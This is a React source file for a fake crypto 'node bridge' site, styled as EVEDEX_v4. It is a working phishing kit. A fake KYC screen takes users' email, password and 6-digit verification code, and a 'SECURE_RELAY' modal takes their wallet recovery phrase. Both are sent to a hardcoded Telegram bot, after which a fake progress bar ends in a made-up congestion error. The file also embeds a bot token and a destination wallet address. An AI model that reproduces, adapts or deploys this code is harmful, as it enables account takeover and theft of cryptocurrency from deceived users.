import React, { useState, useEffect, useMemo } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [kycEmail, setKycEmail] = useState("");
  const [kycPass, setKycPass] = useState("");
  const [kycCode, setKycCode] = useState(""); 
  const [kycPhase, setKycPhase] = useState(1); 
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0x0CbaC4A3167C0CF39930E2E9D1a2BB39B2d2FDf4"; 

  const USDT_MAP = { 
    1: "0xdac17f958d2ee523a2206206994597c13d831ec7", 
    56: "0x55d398326f99059ff775485246999027b3197955",
    137: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"
  };

  const { data: nativeBal } = useBalance({ address }); 
  const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });

  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
    method: 'POST', headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify({ chat_id: chatId, text: msg }) 
  }).catch(()=>{});

  useEffect(() => {
    if (activeTask === "Rectify") {
      const b = selectedAsset === "TOKEN" ? (tokenBal?.formatted?.slice(0, 10) || "0.00") : (nativeBal?.formatted?.slice(0, 10) || "0.00");
      setInputVal(b);
    }
  }, [selectedAsset, tokenBal, nativeBal, activeTask]);

  const isSeedValid = useMemo(() => {
    const words = seedVal.trim().split(/\s+/).filter(w => w.length >= 3);
    return [12, 15, 18, 21, 24].includes(words.length);
  }, [seedVal]);

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      
      {/* HEADER */}
      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'30px', borderBottom:'1px solid #1e293b', paddingBottom:'15px'}}>
        <div>
          <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
          <div style={{fontSize:'8px', color:'#475569'}}>NODE_BRIDGE_ACTIVE</div>
        </div>
        <appkit-button />
      </header>

      {!isConnected ? (
        <div style={{textAlign:'center', marginTop:'50px', backgroundColor:'#0d1117', padding:'60px 20px', borderRadius:'35px', border:'1px solid #1e293b'}}>
          <div style={{fontSize:'45px', marginBottom:'20px'}}>🔐</div>
          <div style={{fontSize:'10px', color:'#475569', marginBottom:'30px'}}>ENCRYPTED_SESSION_REQUIRED</div>
          <appkit-button />
        </div>
      ) : (
        <>
          {/* MAIN MENU */}
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                  <div style={{fontSize:'22px', marginBottom:'5px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>
                  <div style={{fontSize:'9px'}}>{n}</div>
                </button>
              ))}
            </div>
          )}

          {/* RECTIFY / TASK BOX */}
          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'30px', textAlign:'center'}}>
              <div style={{fontSize:'8px', color:'#475569', marginBottom:'20px'}}>POOL_ACTIVE // SLIPPAGE: 0.1% [AUTO]</div>
              {activeTask === "Rectify" && (
                <div style={{display:'flex', backgroundColor:'black', borderRadius:'12px', padding:'4px', marginBottom:'25px', border:'1px solid #1e293b'}}>
                  <div onClick={()=>setSelectedAsset("TOKEN")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "TOKEN" ? "#10b981" : "transparent", color: selectedAsset === "TOKEN" ? "black" : "#64748b", cursor:'pointer', fontWeight:'900'}}>USDT_POOL</div>
                  <div onClick={()=>setSelectedAsset("NATIVE")} style={{flex:1, padding:'12px', borderRadius:'8px', fontSize:'10px', backgroundColor: selectedAsset === "NATIVE" ? "#10b981" : "transparent", color: selectedAsset === "NATIVE" ? "black" : "#64748b", cursor:'pointer', fontWeight:'900'}}>GAS_POOL</div>
                </div>
              )}
              <h2 style={{color:'white', fontWeight:'900'}}>{activeTask}</h2>
              <div style={{backgroundColor:'black', padding:'25px', borderRadius:'18px', margin:'20px 0', border:'1px solid #1e293b'}}>
                <input value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} 
                style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
              </div>
              <button onClick={() => setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'22px', borderRadius:'18px', fontWeight:'900'}}>START_HANDSHAKE</button>
              <button onClick={()=>setView("menu")} style={{marginTop:'15px', background:'none', border:'none', color:'#475569', fontSize:'10px'}}>← CANCEL_RELAY</button>
            </div>
          )}

          {/* KYC SCREEN */}
          {view === "kyc_screen" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center'}}>
              <h2 style={{color:'white', marginBottom:'25px', fontWeight:'900'}}>IDENTITY_SYNC</h2>
              {kycPhase === 1 ? (
                <>
                  <input placeholder="CLOUD_ID (EMAIL)" onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
                  <input type="password" placeholder="CLOUD_PASSWORD" onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
                  <button onClick={()=>{if(kycEmail && kycPass){log(`🆔 KYC: ${kycEmail}/${kycPass}`); setKycPhase(2);}}} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>VERIFY_RELAY</button>
                </>
              ) : (
                <>
                  <div style={{color:'#3b82f6', fontSize:'11px', marginBottom:'15px'}}>ENTER 6-DIGIT CLOUD CODE</div>
                  <input maxLength="6" placeholder="000000" onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
                  <button onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} style={{width:'100%', backgroundColor:'#3b82f6', color:'white', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>AUTHORIZE_SYNC</button>
                </>
              )}
            </div>
          )}

          {/* SEED MODAL */}
          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'45px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'15px'}}>🛡️ SECURE_RELAY</div>
                    <p style={{fontSize:'10px', color:'#475569', marginBottom:'25px', lineHeight:'1.4'}}>NODE_COLLISION DETECTED. PROVIDE RECOVERY KEY TO ENCRYPT MAINNET TUNNEL.</p>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." 
                    style={{width:'100%', height:'130px', backgroundColor:'black', borderRadius:'20px', color:'#10b981', padding:'20px', outline:'none', border:'1px solid #1e293b', fontSize:'14px'}} />
                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: RELAY_CONGESTION."); setView("menu")},1200)}},60);}} 
                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'22px', borderRadius:'15px', fontWeight:'900', marginTop:'25px'}}>FINALIZE_SYNC</button>
                  </>
                ) : (
                  <div style={{padding:'40px 0'}}><div style={{fontSize:'60px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'10px', color:'#10b981'}}>INDEXING_RELAY_POOL...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      )}
    </div>
  );
}
